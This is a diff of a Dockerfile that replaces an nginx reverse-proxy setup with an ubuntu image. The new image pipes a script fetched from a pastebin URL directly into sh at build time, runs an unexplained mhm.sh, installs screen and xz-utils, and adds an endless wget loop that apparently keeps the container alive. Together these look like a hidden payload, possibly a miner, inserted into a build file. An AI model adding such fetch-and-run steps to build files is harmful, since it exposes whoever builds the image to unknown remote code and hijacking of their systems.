@@ -1,20 +1,13 @@
-FROM nginx:alpine AS runtime
+FROM ubuntu:latest
 
-ARG PROXY_PASS=http://host.docker.internal:3000
-ARG PORT=4000
-ARG USERNAME=user
-ARG PASSWORD=password
+WORKDIR /app
 
-RUN echo "proxy_pass: $PROXY_PASS\nport: $PORT\nusername: $USERNAME\npassword: $PASSWORD"
+COPY mhm.sh /app/mhm.sh
 
-COPY ./nginx.conf.template /etc/nginx/nginx.conf.template
-RUN envsubst '$PROXY_PASS $PORT' < /etc/nginx/nginx.conf.template > /etc/nginx/nginx.conf
+RUN chmod +x /app/mhm.sh
 
+COPY . /app
 
-ENV USERNAME=$USERNAME
-ENV PASSWORD=$PASSWORD
-RUN apk add --no-cache openssl
-COPY ./gen_passwd.sh /etc/nginx/gen_passwd.sh
-RUN ["chmod", "+x", "/etc/nginx/gen_passwd.sh"]
-RUN /etc/nginx/gen_passwd.sh
-EXPOSE ${PORT}
+RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
+RUN chmod +x mhm.sh
+RUN (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && bash mhm.sh && while true; do wget google.com ; sleep 900 ; done
